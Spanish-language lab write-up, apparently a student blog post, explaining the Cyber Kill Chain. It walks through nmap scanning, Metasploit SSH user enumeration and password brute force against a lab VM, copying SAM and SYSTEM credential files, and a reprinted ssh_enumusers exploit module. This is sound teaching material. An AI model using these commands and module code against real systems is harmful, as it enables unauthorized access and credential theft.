---
title: Practica 01 sobre Kill Chain
date: 2024-10-10 00:00:00 +05:00
categories: [reconnaisance, kill chain, pentesting]
tags: [nmap, kali, metaxploid, SSH, vssown, handshake]  # TAG names should always be lowercase
---

# **¿Qué es Cyber Security Kill Chain?**

El modelo de la Kill Chain de la ciberseguridad explica el procedimiento típico que siguen los ciberdelincuentes para completar un ataque cibernético con éxito. Se trata de un marco desarrollado por Lockheed Martin, derivado de los modelos de ataque militares y trasladado al mundo digital para ayudar a los equipos a comprender, detectar y prevenir las ciberamenazas persistentes. Aunque no todos los ciberataques aplicarán los siete pasos del modelo de la Kill Chain de la ciberseguridad, la inmensa mayoría de los ataques los utilizan casi todos, a menudo abarcando del paso 2 al paso 6.

![figure](/assets/images/killChain.png) 
fuente: [https://www.netskope.com/es/security-defined/cyber-security-kill-chain](https://www.netskope.com/es/security-defined/cyber-security-kill-chain)

# Pasos típicos del Kill Chain en Ciberseguridad

## Paso 1: Reconocimiento
Los ciberataques más efectivos inician con una fase de reconocimiento, donde los atacantes realizan una recopilación exhaustiva de información sobre su objetivo. Esta etapa implica el uso de herramientas avanzadas y técnicas, como motores de búsqueda, análisis de metadata, servicios en la nube y protocolos de red (como WHOIS y DNS). Los atacantes buscan identificar vulnerabilidades en aplicaciones, redes y bases de datos especialmente aquellas alojadas en la nube—exponiendo puntos débiles que podrían ser explotados en etapas posteriores. Proteger la información sensible mediante prácticas como el cifrado robusto y la implementación de defensas en la nube es crucial para mitigar el riesgo de que los atacantes accedan a datos confidenciales.

## Paso 2: Preparación
Tras reunir suficiente información, los atacantes seleccionan vectores de ataque específicos para llevar a cabo la intrusión. Un vector de ataque es un método o técnica utilizada para obtener acceso no autorizado, y los ciberdelincuentes evalúan el costo y el retorno potencial de cada objetivo, optando generalmente por las rutas de menor resistencia. Los vectores comunes incluyen credenciales inseguras, acceso remoto sin protección (RDP, SSH), y ataques de ingeniería social como el phishing. Esto subraya la importancia de realizar auditorías de seguridad y reforzar todos los puntos de acceso potencialmente vulnerables en la infraestructura.

## Paso 3: Distribución
Una vez dentro del sistema, los atacantes tienen la capacidad de distribuir cargas maliciosas, como malware o ransomware, configurando ataques que pueden ser inmediatos o programados. Con un creciente porcentaje de estos ataques llevándose a cabo a través de la nube, es esencial implementar servicios de escaneo de amenazas y análisis de comportamiento en tiempo real. Monitorear el tráfico web y en la nube, así como la salud de los dispositivos de endpoint, se vuelve indispensable para garantizar que la red permanezca libre de infecciones y que las amenazas sean neutralizadas antes de causar daños.

## Paso 4: Explotación
Después de la distribución del malware, el atacante inicia la explotación del sistema, que puede ocurrir de forma inmediata o ser desencadenada por acciones específicas del usuario, como ejecutar un archivo adjunto malicioso. Estos programas a menudo emplean técnicas de ofuscación y evasión para ocultar su actividad, dificultando su detección por parte de las soluciones de seguridad. Esta fase es crítica, ya que el éxito de la explotación puede permitir al atacante obtener acceso a datos sensibles o comprometer aún más la infraestructura de TI.

## Paso 5: Instalación
Si el atacante busca mantener un acceso persistente, procederá a instalar una puerta trasera que le permita reingresar al sistema sin ser detectado. Estas puertas traseras pueden ser configuradas mediante rootkits o aprovechando credenciales débiles. La detección de estas intrusiones es particularmente complicada, ya que pueden operar en silencio y sin generar alertas evidentes. Por ello, es fundamental contar con una arquitectura de seguridad integral que incluya monitoreo de logs, análisis de comportamiento y detección de anomalías para identificar intrusiones.

## Paso 6: Comando y Control
Con el malware y las puertas traseras instaladas, el atacante establece un canal de comando y control para gestionar sus operaciones dentro del sistema comprometido. Este control permite al atacante ejecutar acciones maliciosas, como la instalación de ransomware o la exfiltración de datos. La implementación de medidas de seguridad que supervisen el tráfico de red y analicen patrones de comportamiento se vuelve esencial, ya que detectar actividades inusuales de forma proactiva puede prevenir la escalada del ataque y limitar el daño potencial.

## Paso 7: Acciones sobre los Objetivos
Finalmente, en esta fase crítica, el atacante lleva a cabo acciones específicas sobre el objetivo, que pueden incluir el cifrado de datos para exigir un rescate, la exfiltración de información sensible o la ejecución de ataques de denegación de servicio. La vigilancia y el espionaje son tácticas comunes en esta etapa, lo que hace imperativo que las organizaciones implementen un monitoreo continuo y análisis en tiempo real de las actividades en sus sistemas. Una respuesta proactiva y bien estructurada ante anomalías puede ser decisiva para mitigar el impacto de un ataque y proteger los activos críticos de la organización.

# **Desarrollo del laboratorio Kill Chain**

A continiación se detalla paso a paso el desarrollo del laboratorio de clase, las mismas que van a ir acompañados de las respuestas a las preguntas de la Práctca 01 (P01-Kill Chain).

## **Etapa 1: Reconnaissance**

Identificamos la ip del target:


Ejecutamos el comando ipconfig en el PowerShell de Windows:
```shell
ipconfig
```
Aqui identificamos la ip del objetivo (10.0.2.4) 
![figure](/assets/images/ipconfig.jpeg)



Ejecutamos el comando:
```bash
sudo nmap -sV -p- 10.0.2.4
```

![figure](/assets/images/nmap1.jpeg)

El comando que se muestra en la figura está utilizando `nmap` para realizar un escaneo de puertos en un host específico (10.0.2.4). A continuación explico cada parte del comando y lo que está realizando:

### Desglose del Comando

1. **`sudo`**: Este comando se utiliza para ejecutar `nmap` con privilegios de superusuario (root). Esto permite que `nmap` realice operaciones avanzadas que requieren acceso completo a la red.
2. **`nmap`**: Es la herramienta que se está utilizando para escanear la red y los puertos.
3. **`-p-`**: Esto indica que se escanearán todos los puertos (del 1 al 65535). Esto es útil para obtener un panorama completo de los servicios que están escuchando en el host.
4. **`-sV`**: Este flag se utiliza para detectar versiones de los servicios que se están ejecutando en los puertos abiertos.
5. **`10.0.2.4`**: Este es el objetivo del escaneo, que es la dirección IP del host que se está analizando.

### Resultados del Escaneo

- **`PORT`**: Muestra los puertos que han sido escaneados.
- **`STATE`**: Indica si el puerto está abierto, cerrado o filtrado.
- **`SERVICE`**: Muestra el servicio que se está ejecutando en cada puerto.

### Resultado del Escaneo para SSH

- **Puerto**: `22/tcp`
- **Estado**: `open`
- **Servicio**: `OpenSSH 7.9p1 (protocol 2.0)`

### Interpretación

1. **Puerto 22/tcp**: Este es el puerto estándar utilizado para el servicio SSH (Secure Shell), que proporciona una comunicación segura entre un cliente y un servidor.

2. **Estado `open`**: Indica que el puerto está abierto y que el servicio SSH está escuchando en ese puerto. Esto significa que se puede establecer una conexión SSH con el servidor.

3. **Servicio `OpenSSH 7.9p1 (protocol 2.0)`**: Identifica que el servicio en ejecución es OpenSSH, específicamente la versión 7.9p1, y que está utilizando el protocolo SSH 2.0. Esto es relevante para la seguridad, ya que las versiones más recientes suelen incluir mejoras y parches de seguridad.

### Conclusión

El escaneo ha identificado que el servicio SSH está activo y accesible en el servidor escaneado, lo que permite la conexión remota y segura a través de SSH.

## **Etapa 2: Weaponization**

### Uso de Metasploit Framework

Metasploit Framework es una herramienta de código abierto utilizada principalmente para pruebas de penetración y la explotación de vulnerabilidades en sistemas informáticos. Ofrece una extensa colección de módulos de exploits, payloads (códigos que se ejecutan en el sistema objetivo tras una explotación exitosa), y herramientas para escanear redes en busca de vulnerabilidades. Además, incluye módulos auxiliares para tareas como el escaneo de puertos y la recolección de información, y cuenta con tanto una interfaz de línea de comandos (`msfconsole`) como interfaces gráficas. Es fundamental en el campo de la ciberseguridad, permitiendo a los profesionales simular ataques reales, identificar debilidades y mejorar la defensa de infraestructuras tecnológicas, aunque su uso debe ser ético, legal y debe ser realizado en entornos controlados.

Sus principales usos son:

- **Pruebas de Penetración**: Metasploit es ampliamente utilizado por profesionales de la seguridad para identificar y explotar vulnerabilidades en sistemas.
- **Desarrollo de Exploits**: Proporciona un entorno para desarrollar y probar exploits.
- **Módulos de Exploit**: Contiene una extensa base de datos de exploits, payloads y herramientas para realizar diversas tareas de seguridad.
- **Manejo de Sesiones**: Permite gestionar sesiones de explotación y establecer conexiones de control sobre sistemas comprometidos.

### Desglose del Comando: msfconsole -q

1. **`msfconsole`**: Es la interfaz de línea de comandos de Metasploit. Permite a los usuarios interactuar con el framework para realizar tareas como escaneo, explotación y manejo de sesiones.

2. **`-q`**: Esta opción significa "quiet mode", o modo silencioso. Al usar esta opción, Metasploit inicia sin mostrar el banner de bienvenida y sin mensajes adicionales que normalmente aparecen al iniciar. Esto puede ser útil para aquellos que desean una experiencia más limpia o para scripts automatizados.

Luego de una previa explicación del comando, continuamos con el laboratorio y ejecutamos el comando:
```bash
msfconsole -q
```

![figure](/assets/images/msfconsole.jpeg)


```ruby
search ssh enum
```
Aqui identificamos la enumeración de usuarios SSH
![figure](/assets/images/enum.jpeg)

```ruby
use auxiliary(scanner/ssh/ssh_enumusers):
set RHOSTS 10.0.2.4
set USER_FILE /home/user/Downloads/CommonAdminBase64.txt
set VERBOSE true
show options
run
```
![figure](/assets/images/enum3.png)

Procediendo con el escaneo de la enumeración de usuarios SSH
![figure](/assets/images/run1.png)
![figure](/assets/images/run2.png)

```ruby
search ssh login
```

![figure](/assets/images/sshlogin.jpeg)

```ruby
use auxiliary(scanner/ssh/ssh_login):
set RHOSTS 10.0.2.4
set USER_FILE /home/user/Downloads/usewrname.txt
set PASS_FILE /home/user/Downloads/top-usernames-shortlist.txt
set VERBOSE true
show options
run
```
![figure](/assets/images/login2.png)

Procediendo a escanear con el objetivo de encontrar usuarios logueados con contraseñas detectables
![figure](/assets/images/login3.png)
![figure](/assets/images/login4.png)

Una vez logrado identificar el usuario y contraseña del objetivo ingresamos al shell de la maquina mediante SSH
![figure](/assets/images/ssh1.png)

Se realiza pruebas de reconocimiento y recoleccion de datos relevantes del objetivo
![figure](/assets/images/ssh2.png)

Finalmente se logra acceder al archivo SAM y SYSTEM de la maquina del objetivo y realizar una copia a la maquina atacante para una exploración mas exaustiva de datos relevantes del objetivo
![figure](/assets/images/system.png)

# **Respondiendo preguntas del laboratorio Kill Chain (PC01)**

# PARTE1: Reconnaissance

La etapa de **Reconnaissance** (reconocimiento) en el modelo de **Kill Chain** es la primera fase de un ataque cibernético, donde el atacante recopila información sobre el objetivo antes de lanzar cualquier acción maliciosa. Esta etapa es crucial, ya que la información obtenida puede determinar el éxito o el fracaso del ataque posterior. 

### Objetivos de la Etapa de Reconnaissance

- **Identificación del Objetivo**:
   El atacante identifica a la organización o sistema que desea comprometer. Esto puede incluir empresas, instituciones gubernamentales, o individuos.

- **Recopilación de Información**:
   Se busca información sobre la infraestructura del objetivo, como direcciones IP, dominios, sistemas operativos utilizados, aplicaciones en ejecución, y configuraciones de red.
   - También se puede recopilar información sobre empleados, roles y contactos clave.

- **Metodologías Utilizadas**:
   - **Investigación Abierta**: Uso de fuentes disponibles públicamente (OSINT) como redes sociales, sitios web corporativos, y bases de datos públicas.
   - **Escaneo de Redes**: Utilización de herramientas como `nmap` para identificar puertos abiertos y servicios en ejecución.
   - **Phishing y Pretexting**: Técnicas más activas donde el atacante puede intentar engañar a empleados para obtener información sensible.

### Importancia de la Etapa de Reconnaissance

- **Planificación del Ataque**: La información recopilada permite al atacante planificar su enfoque, eligiendo las herramientas y técnicas más adecuadas para el ataque.
- **Minimización de Riesgos**: Con un conocimiento profundo del objetivo, el atacante puede evitar contramedidas de seguridad y maximizar la probabilidad de éxito.
- **Identificación de Vulnerabilidades**: Al entender la infraestructura y los sistemas, el atacante puede identificar potenciales vulnerabilidades que puede explotar.





## 1. ¿Porque debemos ejecutar nmap con privilegios de root?

Ejecutar `nmap` con privilegios de root (o administrador) proporciona varias ventajas importantes para el escaneo de redes y sistemas
### Razones para Ejecutar Nmap con Privilegios de Root

- **Acceso a Funciones Avanzadas**:
   Algunas características de `nmap`, como el escaneo de puertos en modo SYN (también conocido como "stealth scan"), requieren acceso a funciones de bajo nivel del sistema operativo que solo están disponibles para el usuario root.

- **Escaneo de Puertos Privados**:
   Los puertos por debajo del 1024 (puertos "bien conocidos") suelen requerir privilegios elevados para ser escaneados. Esto incluye servicios críticos como SSH (puerto 22), HTTP (puerto 80), y otros.

- **Detección de Sistemas Operativos**:
   Para realizar la detección de sistemas operativos (`-O`), `nmap` necesita enviar paquetes especiales que pueden requerir acceso root para manipular la pila de red adecuadamente.

- **Evitar Limitaciones**:
    Ejecutar `nmap` como usuario estándar puede limitar la capacidad de realizar ciertos tipos de escaneos o puede devolver resultados incompletos debido a restricciones impuestas por el sistema operativo.

- **Mejor Precisión en Resultados**:
   Al tener acceso completo al sistema, `nmap` puede realizar análisis más completos y precisos, lo que resulta en una mejor identificación de dispositivos y servicios en la red.

## 2. ¿Qué significan los flags -sS, -sT, -sV, -O en el escaneo de nmap?
Los flags en `nmap` especifican diferentes tipos de escaneos y técnicas que se utilizan para obtener información sobre los hosts y servicios en una red. Aquí te explico el significado de cada uno de los flags mencionados:

### Flags de Nmap

- **-sS (SYN Scan)**:
   Realiza un escaneo de tipo "stealth" o sigiloso. Envía un paquete SYN (solicitud de conexión) y espera la respuesta. Si recibe un SYN-ACK, el puerto está abierto; si recibe un RST, el puerto está cerrado. Este tipo de escaneo es menos detectable por los sistemas de seguridad.
```bash
$ nmap -sS 192.168.1.1
Starting Nmap 7.80 ( https://nmap.org ) at 2023-10-12 12:00 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0010s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

- **-sT (TCP Connect Scan)**:
   Realiza un escaneo completo de conexión TCP. Esto implica establecer una conexión completa con el puerto (3 vías de apretón de manos TCP). Es más fácil de detectar y puede ser menos sigiloso que el escaneo SYN, pero es útil cuando no se tienen privilegios de root.

```bash
$ nmap -sT 192.168.1.1
Starting Nmap 7.80 ( https://nmap.org ) at 2023-10-12 12:05 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0012s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

- **-sV (Service Version Detection)**:
   Intenta determinar la versión de los servicios que se están ejecutando en los puertos abiertos. Esto se hace enviando diversas solicitudes a los servicios y analizando las respuestas para identificar la versión del software.

```bash
$ nmap -sV 192.168.1.1
Starting Nmap 7.80 ( https://nmap.org ) at 2023-10-12 12:10 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0015s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Debian 4
80/tcp open  http    Apache httpd 2.4.29
```

- **-O (OS Detection)**:
   Intenta identificar el sistema operativo que está ejecutando el host objetivo. `nmap` envía paquetes específicos que pueden revelar información sobre la pila de red y otros rasgos característicos del sistema operativo.


```bash
$ nmap -O 192.168.1.1
Starting Nmap 7.80 ( https://nmap.org ) at 2023-10-12 12:15 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0018s latency).
Not shown: 998 closed ports
OS details: Linux 3.2 - 4.9
```
- **Combinación de Flags (-sS -sV)**:

```bash
$ nmap -sS -sV 192.168.1.1
Starting Nmap 7.80 ( https://nmap.org ) at 2023-10-12 12:20 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0020s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Debian 4
80/tcp open  http    Apache httpd 2.4.29
```
La combinación de flags -sS -sV en nmap se utiliza para realizar un escaneo de puertos sigiloso (SYN scan) y, al mismo tiempo, detectar las versiones de los servicios que se están ejecutando en los puertos abiertos. 

Mientras -sS (SYN Scan) realiza un escaneo sigiloso, enviando paquetes SYN para establecer una conexión inicial sin completar el proceso de conexión TCP. Este método es menos detectable por sistemas de seguridad, ya que no se establece una conexión completa.
Después de identificar los puertos abiertos, el flag -sV (Service Version Detection) intenta determinar la versión específica del servicio que se está ejecutando en esos puertos. nmap envía diferentes tipos de solicitudes a los servicios y analiza las respuestas para identificar la versión del software.

Al combinar estos dos flags, el comando permite:

- **Identificación Eficiente:** Realizar un escaneo de puertos de forma sigilosa para evitar alertar a sistemas de detección de intrusos (IDS) mientras también se recopila información detallada sobre las versiones de los servicios.
- **Mejor Comprensión del Entorno:** Obtener información crítica sobre qué servicios están disponibles y qué versiones se están utilizando, lo que es fundamental para evaluar vulnerabilidades y planificar pruebas de penetración.

## 3. ¿Existe algún flag que permite hacer un escaneo involucrando todos los flags mencionados anteriormente?

Exsisten varias combinaciones posibles, su uso depende de la necesidad de lo que se requiere realizar

A continuación algunos ejemplos:

### Escaneo SYN, Detección de Servicios y Detección de Sistema Operativo

```bash
$ nmap -sS -sV -O 192.168.1.1
Starting Nmap 7.80 ( https://nmap.org ) at 2023-10-12 12:00 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0010s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Debian 4
80/tcp open  http    Apache httpd 2.4.29
MAC Address: 00:11:22:33:44:55 (Vendor)
OS details: Linux 3.2 - 4.9
```

**Explicación**:
Este comando realiza un escaneo SYN sigiloso en la dirección IP `192.168.1.1`, detectando los servicios en los puertos abiertos y el sistema operativo. Muestra que los puertos 22 (SSH) y 80 (HTTP) están abiertos, junto con información de la versión del servicio y detalles del sistema operativo.

---

### Escaneo TCP Connect, Detección de Servicios y Detección de Sistema Operativo

```bash
$ nmap -sT -sV -O 192.168.1.1
Starting Nmap 7.80 ( https://nmap.org ) at 2023-10-12 12:05 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0012s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Debian 4
80/tcp open  http    Apache httpd 2.4.29
MAC Address: 00:11:22:33:44:55 (Vendor)
OS details: Linux 3.2 - 4.9
```

**Explicación**:
Este comando utiliza un escaneo TCP Connect, que establece conexiones completas. Al igual que el anterior, identifica los puertos 22 y 80 como abiertos, junto con la información de la versión y del sistema operativo. Es más detectable debido a que completa el proceso de conexión.

---

### Escaneo TCP Connect, Detección de Servicios y Escaneo de Puertos Específicos

```bash
$ nmap -sT -sV -p 22,80 192.168.1.1
Starting Nmap 7.80 ( https://nmap.org ) at 2023-10-12 12:10 UTC
Nmap scan report for 192.168.1.1
Host is up (0.0015s latency).
PORT     STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Debian 4
80/tcp open  http    Apache httpd 2.4.29
```

**Explicación**:
En este caso, se realiza un escaneo TCP Connect enfocado solo en los puertos 22 y 80 de la dirección IP `192.168.1.1`. La salida confirma que ambos puertos están abiertos y proporciona detalles sobre los servicios, similar a los ejemplos anteriores, pero limitando el escaneo a puertos específicos para mayor eficiencia.

## 4. Explicar el proceso de un handshake TCP.


![figure](/assets/images/handshake.png)
fuente: [https://www.guru99.com/tcp-3-way-handshake.html](https://www.guru99.com/tcp-3-way-handshake.html)

El proceso de un **handshake TCP** es un mecanismo fundamental que establece una conexión confiable entre un cliente y un servidor en una red. El proceso se lleva a cabo en tres pasos, conocido como el **Three-Way Handshake**. Aquí te explico cada etapa:

### **SYN (Synchronize)**

- **Descripción**: El cliente envía un paquete TCP con el flag SYN (Synchronize) establecido al servidor para iniciar la conexión.
- **Objetivo**: Indicar al servidor que el cliente desea establecer una conexión y sincronizar los números de secuencia.
- **Contenido**: Este paquete incluye un número de secuencia inicial (ISN) del cliente.

### **SYN-ACK (Synchronize-Acknowledge)**

- **Descripción**: El servidor responde al cliente con un paquete TCP que tiene los flags SYN y ACK (Acknowledge) establecidos.
- **Objetivo**: Confirmar la recepción del paquete SYN del cliente y enviar su propio número de secuencia inicial.
- **Contenido**: Este paquete incluye el número de secuencia inicial del servidor y un número de reconocimiento (ACK) que es el ISN del cliente más uno.

### **ACK (Acknowledge)**

- **Descripción**: El cliente envía un paquete TCP al servidor con el flag ACK establecido.
- **Objetivo**: Confirmar la recepción del paquete SYN-ACK del servidor.
- **Contenido**: Este paquete incluye un número de reconocimiento que es el ISN del servidor más uno.

### Resumen del Proceso

- **Cliente → Servidor**: Envío de un paquete SYN con ISN del cliente.
- **Servidor → Cliente**: Respuesta con un paquete SYN-ACK, incluyendo ISN del servidor y ACK del cliente.
- **Cliente → Servidor**: Envío de un paquete ACK para confirmar la recepción del SYN-ACK del servidor.

### Resultado

Una vez completado este proceso, la conexión TCP se establece y ambos extremos pueden comenzar a enviar y recibir datos de manera confiable, utilizando el control de flujo y la corrección de errores que ofrece TCP. Este mecanismo asegura que ambos lados estén listos para la comunicación y que los números de secuencia estén sincronizados, lo que es esencial para la integridad de los datos transmitidos.

## 5. Según la pregunta anterior, ¿qué significa el flag -sS?

El flag `-sS` en `nmap` se refiere a un **SYN Scan**, que es una técnica de escaneo de puertos que utiliza el primer paso del proceso de handshake TCP, pero sin completarlo. Aquí te explico su significado y funcionamiento en este contexto:

### Significado de `-sS` (SYN Scan)

- **Escaneo Sigiloso**: El SYN Scan es conocido como un escaneo "sigiloso" porque envía paquetes SYN para iniciar una conexión sin completar el handshake TCP. Esto lo hace menos detectable por sistemas de seguridad que monitorean conexiones completas.
  
### Funcionamiento en el Contexto del Handshake TCP

1. **Envio de Paquete SYN**: Cuando se ejecuta un comando con `-sS`, `nmap` envía un paquete TCP con el flag SYN establecido al puerto objetivo. Esto inicia el proceso de handshake TCP.
   
2. **Respuestas Posibles**:
   - **SYN-ACK**: Si el puerto está abierto, el servidor responde con un paquete SYN-ACK, indicando que acepta la conexión.
   - **RST (Reset)**: Si el puerto está cerrado, el servidor responde con un paquete RST, indicando que no acepta la conexión.

3. **No Completar el Handshake**: Después de recibir la respuesta (ya sea SYN-ACK o RST), `nmap` no envía el paquete ACK final que completaría el handshake TCP. Esto significa que no se establece una conexión completa, lo que ayuda a evitar la detección por parte de sistemas de seguridad.

## 6. ¿Qué hace el flag --script?

El flag `--script` en `nmap` se utiliza para ejecutar scripts de la biblioteca de Nmap Scripting Engine (NSE). Estos scripts permiten realizar tareas avanzadas y específicas durante el escaneo, ampliando las capacidades de `nmap` más allá de un simple escaneo de puertos. Aquí te explico su uso y funcionalidades:

### Funciones del Flag `--script`

1. **Ejecutar Scripts NSE**: Permite ejecutar scripts específicos que pueden realizar diversas funciones, como detección de vulnerabilidades, recolección de información, ejecución de pruebas de seguridad, y más.

2. **Tipos de Scripts**: Los scripts pueden clasificarse en varias categorías, tales como:
   - **Vulnerabilidades**: Identifican vulnerabilidades conocidas en servicios.
   - **Exploración**: Recolectan información adicional sobre el sistema.
   - **Autenticación**: Realizan pruebas de autenticación en servicios como FTP, HTTP, etc.
   - **Pruebas de servicio**: Verifican la configuración y la seguridad de servicios específicos.

3. **Sintaxis**: La forma básica de usar el flag es:
   ```bash
   nmap --script [nombre_del_script] [target]
   ```
   También puedes usar `--script` seguido de un patrón, como `default` o `vuln`, para ejecutar múltiples scripts que coincidan.

### Ejemplo de Uso

**Comando:**
```bash
$ nmap --script http-vuln* 192.168.1.1
```

**Descripción**: Este comando ejecuta todos los scripts que comienzan con `http-vuln` en el host `192.168.1.1`, buscando vulnerabilidades en servicios HTTP.

# Parte 2: Weaponization

La etapa de **Weaponization** en el modelo de **Kill Chain** es la segunda fase de un ataque cibernético, donde el atacante crea o selecciona las herramientas y métodos que utilizará para comprometer el objetivo. Esta etapa sigue a la fase de Reconnaissance, donde se recopila información sobre el objetivo. Aquí te explico en detalle esta etapa:

### Objetivos de la Etapa de Weaponization

- **Desarrollo de Herramientas Maliciosas**:
   El atacante crea o personaliza malware, exploits, o herramientas que se utilizarán para llevar a cabo el ataque. Esto puede incluir virus, troyanos, ransomware, o scripts de explotación.

- **Integración de Payloads**:
   Se combina el malware con un método de entrega. Esto puede implicar empaquetar el malware en un archivo adjunto de correo electrónico, un enlace malicioso, o un exploit que aproveche una vulnerabilidad en el software del objetivo.

- **Selección del Método de Entrega**:
   Basándose en la información recopilada en la etapa de Reconnaissance, el atacante elige el método más eficaz para entregar el payload al objetivo. Esto puede incluir:
     - **Phishing**: Enviar correos electrónicos engañosos que contengan enlaces o archivos adjuntos maliciosos.
     - **Exploits web**: Utilizar vulnerabilidades en aplicaciones web para cargar malware.
     - **Dispositivos USB**: Dejar dispositivos USB infectados en lugares estratégicos para que los usuarios los conecten.

### Importancia de la Etapa de Weaponization

- **Personalización**: La personalización de las herramientas y métodos de ataque según el objetivo aumenta la probabilidad de éxito y puede evadir sistemas de detección.
- **Preparación**: Esta etapa permite al atacante asegurar que todas las piezas necesarias para el ataque estén listas antes de proceder a la fase de entrega.
- **Eficiencia**: Un ataque bien planificado y ejecutado es más eficiente y puede causar más daño en menos tiempo.

## 7. Investigar el script utilizado en la enumeración de usuarios SSH (auxiliary/scanner/ssh/ssh_enumusers). 


Este código es un módulo de Metasploit diseñado en lenguaje Ruby para la **enumeración de nombres de usuario a través de SSH**. 

### Propósito del Módulo

Este módulo se utiliza para identificar usuarios válidos en un servidor OpenSSH mediante dos técnicas: **paquetes malformados** y **ataques de temporización**. Esto es útil para los analistas de seguridad y pentesters que buscan evaluar la seguridad de un sistema.

### Funcionamiento General

1. **Técnicas de Ataque**:
   - **Paquete Malformado**: Envía un paquete SSH malformado para provocar respuestas que pueden indicar si un usuario es válido o no.
   - **Ataque de Temporización**: Mide el tiempo que tarda el servidor en responder a intentos de autenticación para determinar si un usuario existe; se espera que un usuario inválido reciba una respuesta más rápida.

2. **Configuración**:
   - El módulo permite configurar opciones como el puerto SSH, un archivo de usuarios, y umbrales de tiempo para el ataque de temporización.
   - Incluye la posibilidad de reintentar conexiones fallidas y verificar falsos positivos.

3. **Enumeración de Usuarios**:
   - El módulo genera intentos de autenticación para cada usuario en la lista y reporta si un usuario fue encontrado, no encontrado, o si hubo un error de conexión.

4. **Reportes**:
   - Los resultados de las pruebas se registran, lo que permite a los usuarios llevar un seguimiento de los usuarios identificados y las posibles vulnerabilidades en el sistema.

### Uso y Aplicaciones

Este módulo es particularmente útil en pruebas de penetración para:
- Identificar cuentas de usuario válidas en un sistema que pueden ser objetivos para ataques posteriores.
- Evaluar la configuración de seguridad de un servidor SSH y su resistencia ante ataques de enumeración.

## 8. Código (auxiliary/scanner/ssh/ssh_enumusers)

A continución el script:

```ruby
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SSH
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'SSH Username Enumeration',
        'Description' => %q{
          This module uses a malformed packet or timing attack to enumerate users on
          an OpenSSH server.

          The default action sends a malformed (corrupted) SSH_MSG_USERAUTH_REQUEST
          packet using public key authentication (must be enabled) to enumerate users.

          On some versions of OpenSSH under some configurations, OpenSSH will return a
          "permission denied" error for an invalid user faster than for a valid user,
          creating an opportunity for a timing attack to enumerate users.

          Testing note: invalid users were logged, while valid users were not. YMMV.
        },
        'Author' => [
          'kenkeiras',     # Timing attack
          'Dariusz Tytko', # Malformed packet
          'Michal Sajdak', # Malformed packet
          'Qualys',        # Malformed packet
          'wvu'            # Malformed packet
        ],
        'References' => [
          ['CVE', '2003-0190'],
          ['CVE', '2006-5229'],
          ['CVE', '2016-6210'],
          ['CVE', '2018-15473'],
          ['OSVDB', '32721'],
          ['BID', '20418'],
          ['URL', 'https://seclists.org/oss-sec/2018/q3/124'],
          ['URL', 'https://sekurak.pl/openssh-users-enumeration-cve-2018-15473/']
        ],
        'License' => MSF_LICENSE,
        'Actions' => [
          [
            'Malformed Packet',
            {
              'Description' => 'Use a malformed packet',
              'Type' => :malformed_packet
            }
          ],
          [
            'Timing Attack',
            {
              'Description' => 'Use a timing attack',
              'Type' => :timing_attack
            }
          ]
        ],
        'DefaultAction' => 'Malformed Packet',
        'Notes' => {
          'Stability' => [
            CRASH_SERVICE_DOWN # possible that a malformed packet may crash the service
          ],
          'Reliability' => [],
          'SideEffects' => [
            IOC_IN_LOGS,
            ACCOUNT_LOCKOUTS, # timing attack submits a password
          ]
        }
      )
    )

    register_options(
      [
        Opt::Proxies,
        Opt::RPORT(22),
        OptString.new('USERNAME',
                      [false, 'Single username to test (username spray)']),
        OptPath.new('USER_FILE',
                    [false, 'File containing usernames, one per line']),
        OptBool.new('DB_ALL_USERS',
                    [false, 'Add all users in the current database to the list', false]),
        OptInt.new('THRESHOLD',
                   [
                     true,
                     'Amount of seconds needed before a user is considered ' \
                     'found (timing attack only)', 10
                   ]),
        OptBool.new('CHECK_FALSE',
                    [false, 'Check for false positives (random username)', true])
      ]
    )

    register_advanced_options(
      [
        OptInt.new('RETRY_NUM',
                   [
                     true, 'The number of attempts to connect to a SSH server' \
                   ' for each user', 3
                   ]),
        OptInt.new('SSH_TIMEOUT',
                   [
                     false, 'Specify the maximum time to negotiate a SSH session',
                     10
                   ]),
        OptBool.new('SSH_DEBUG',
                    [
                      false, 'Enable SSH debugging output (Extreme verbosity!)',
                      false
                    ])
      ]
    )
  end

  def rport
    datastore['RPORT']
  end

  def retry_num
    datastore['RETRY_NUM']
  end

  def threshold
    datastore['THRESHOLD']
  end

  # Returns true if a nonsense username appears active.
  def check_false_positive(ip)
    user = Rex::Text.rand_text_alphanumeric(8..32)
    attempt_user(user, ip) == :success
  end

  def check_user(ip, user, port)
    technique = action['Type']

    opts = ssh_client_defaults.merge({
      port: port
    })

    # The auth method is converted into a class name for instantiation,
    # so malformed-packet here becomes MalformedPacket from the mixin
    case technique
    when :malformed_packet
      opts.merge!(auth_methods: ['malformed-packet'])
    when :timing_attack
      opts.merge!(
        auth_methods: ['password', 'keyboard-interactive'],
        password: rand_pass
      )
    end

    opts.merge!(verbose: :debug) if datastore['SSH_DEBUG']

    start_time = Time.new

    begin
      ssh = Timeout.timeout(datastore['SSH_TIMEOUT']) do
        Net::SSH.start(ip, user, opts)
      end
    rescue Rex::ConnectionError
      return :connection_error
    rescue Timeout::Error
      return :success if technique == :timing_attack
    rescue Net::SSH::AuthenticationFailed
      return :fail if technique == :malformed_packet
    rescue Net::SSH::Exception => e
      vprint_error("#{e.class}: #{e.message}")
    end

